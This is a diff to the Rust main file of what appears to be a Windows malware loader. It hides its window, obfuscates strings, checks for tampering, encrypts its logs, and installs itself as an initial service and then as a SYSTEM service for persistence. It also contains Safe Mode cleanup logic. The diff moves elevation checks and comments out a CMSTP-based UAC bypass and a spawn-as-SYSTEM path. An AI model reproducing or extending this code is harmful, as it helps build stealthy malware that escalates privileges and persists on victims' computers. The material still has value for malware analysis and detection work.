@@ -1,24 +1,13 @@
 #![windows_subsystem = "windows"]
 
 use lazy_static::lazy_static;
-use loader_vars::constants::{ initial_log_directory, loader_service_name, system_log_directory };
+use loader_vars::constants::{ initial_log_directory, system_log_directory };
 use safemode::{ runner::clean_up, utils::{ is_safe_mode, safemode_fail_safe } };
-use service::{
-    runner::start_service,
-    utils::{
-        get_service_install_state,
-        install_initial_service,
-        install_system_service,
-        ServiceInstallState,
-    },
-};
+use service::{ runner::start_service, utils::{ install_initial_service, install_system_service } };
 use shared::{
     constants::logs_encryption_key,
     logs::logger::Logger,
-    uac::{
-        checks::{ is_elevated, is_system },
-        impersonate_admin::{ open_self_as_admin, try_kill_cmstp },
-    },
+    uac::checks::{ is_elevated, is_system },
     utils::{
         anti_tampering::is_clean,
         config::load_mib_config,
@@ -31,7 +20,7 @@ use shared::{
     },
 };
 use windows_service_detector::is_running_as_windows_service;
-use std::{ sync::Mutex, thread };
+use std::sync::Mutex;
 use obfstr::obfstr as s;
 
 mod network;
@@ -129,6 +118,12 @@ macro_rules! tag {
 }
 
 fn main() {
+    if !is_clean() {
+        exit_1();
+    }
+    if !is_elevated().unwrap_or(false) {
+        exit_1();
+    }
     let is_running_from_system_dir = is_running_from_system32();
     let log_directory = match is_running_from_system_dir {
         true => { system_log_directory() }
@@ -140,57 +135,40 @@ fn main() {
     }
     info!("Init");
 
-    if !is_clean() {
-        tag!("NOT-CLEAN");
-        exit_1();
-    }
-
     let mib_config = load_mib_config(false);
 
-    let is_elevated = is_elevated().unwrap_or_else(|error| {
-        err!("is_elevated Error, assuming false: ", error);
-        false
-    });
+    // if !is_elevated {
+    //     if !mib_config.cln_up_done {
+    //         if
+    //             let Ok(out) = get_service_install_state(
+    //                 &loader_service_name(),
+    //                 get_current_exe().to_str().unwrap()
+    //             )
+    //         {
+    //             match out.0 {
+    //                 SrvcIstlState::ExistsSameExe => {
+    //                     tag!("DISMISS-ELEVATE-CLEAN-UP-IN-PROGRESS");
+    //                     exit_1();
+    //                 }
+    //                 _ => {}
+    //             }
+    //         }
+    //     }
 
-    if !is_elevated {
-        if !mib_config.clean_up_done {
-            if
-                let Ok(out) = get_service_install_state(
-                    &loader_service_name(),
-                    get_current_exe().to_str().unwrap()
-                )
-            {
-                match out.0 {
-                    ServiceInstallState::ExistsSameExe => {
-                        tag!("DISMISS-ELEVATE-CLEAN-UP-IN-PROGRESS");
-                        exit_1();
-                    }
-                    _ => {}
-                }
-            }
-        }
+    //     tag!("ELEVATE");
 
-        tag!("ELEVATE");
-
-        if let Err(error) = open_self_as_admin() {
-            err!("open_self_as_admin Error: ", error);
-        }
-        exit_1();
-    }
-    let is_system = is_system().unwrap_or_else(|error| {
-        err!("is_system Error, assuming false: ", error);
-        false
-    });
-
-    if is_system {
-        if is_safe_mode() {
-            tag!("CLEANUP");
-            if let Err(error) = clean_up() {
-                err!("clean_up Error: ", error);
-                safemode_fail_safe();
-            }
-        }
-    }
+    //     if let Err(error) = open_self_as_admin() {
+    //         err!("open_self_as_admin Error: ", error);
+    //     }
+    //     let cmstp_cleanup_handle = thread::spawn(move || {
+    //         if let Err(error) = try_kill_cmstp() {
+    //             err!("try_kill_cmstp Error: ", error);
+    //         }
+    //         std::fs::remove_file(get_current_exe_dir().join(s!("tmp.ini")))
+    //     });
+    //     let _ = cmstp_cleanup_handle.join();
+    //     exit_1();
+    // }
 
     let is_service = is_running_as_windows_service().unwrap_or_else(|error| {
         err!("is_running_as_windows_service Error, assuming true:", error);
@@ -201,44 +179,50 @@ fn main() {
             err!("start_service Error: ", error);
         }
     } else {
-        if is_running_from_system_dir {
+        if is_safe_mode() {
+            let is_system = is_system().unwrap_or_else(|error| {
+                err!("is_system Error, assuming false: ", error);
+                false
+            });
             if is_system {
-                tag!("SYS-SERVICE-INSTALL");
-
-                if let Err(error) = install_system_service() {
-                    err!("install_system_service Error: ", error);
-                }
-            } else {
-                tag!("LAUNCH-SYS-SERVICE-INSTALL");
-                if
-                    let Err(error) = try_spawn_program_as_system(
-                        get_current_exe().to_str().unwrap(),
-                        None
-                    )
-                {
-                    err!("try_spawn_program_as_system Error: ", error);
+                tag!("CLEANUP");
+                if let Err(error) = clean_up() {
+                    err!("clean_up Error: ", error);
+                    safemode_fail_safe();
                 }
             }
-        } else {
-            if !mib_config.clean_up_done {
-                tag!("INITIAL-SERVICE-INSTALL");
-                // if we get passed elev arg - means we used elev so then CLEANUP
-                let cmstp_cleanup_handle = thread::spawn(move || {
-                    if let Err(error) = try_kill_cmstp() {
-                        err!("try_kill_cmstp Error: ", error);
-                    }
-                });
+        }
+        if is_running_from_system_dir {
+            // let is_system = is_system().unwrap_or_else(|error| {
+            //     err!("is_system Error, assuming false: ", error);
+            //     false
+            // });
+            // if is_system {
+            tag!("SYS-SERVICE-INSTALL");
 
-                if let Err(error) = install_initial_service() {
-                    err!("install_initial_service Error: ", error);
-                }
-                let _ = cmstp_cleanup_handle.join();
-            } else {
-                tag!("NON-SERVICE-WITH-ADMIN-AFTER-CLEAN");
-                warn!("not expected");
+            if let Err(error) = install_system_service() {
+                err!("install_system_service Error: ", error);
+            }
+            // } else {
+            //     tag!("LAUNCH-SYS-SERVICE-INSTALL");
+            //     if
+            //         let Err(error) = try_spawn_program_as_system(
+            //             get_current_exe().to_str().unwrap(),
+            //             None
+            //         )
+            //     {
+            //         err!("try_spawn_program_as_system Error: ", error);
+            //     }
+            // }
+        } else if !mib_config.cln_up_done {
+            tag!("INITIAL-SERVICE-INSTALL");
+
+            if let Err(error) = install_initial_service() {
+                err!("install_initial_service Error: ", error);
             }
         }
     }
+    exit_1();
 }
 
 // move logs elsewhere? idk honestly - after install system
